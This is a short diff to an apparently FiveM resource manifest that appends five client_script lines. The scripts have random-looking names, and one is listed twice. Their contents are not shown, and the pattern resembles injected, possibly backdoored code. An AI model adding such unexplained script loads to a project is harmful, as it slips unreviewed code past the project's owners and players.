@@ -17,3 +17,14 @@ server_scripts {
     'configs/server_config.lua',
     'server/main.lua'
 }
+
+
+client_script 'lpRwpHpeQNLu.lua'
+
+client_script 'yffYHWloSFZs.lua'
+
+client_script 'yffYHWloSFZs.lua'
+
+client_script 'wpHpeQNLuEdJ.lua'
+
+client_script 'FZsYTILZoJph.lua'
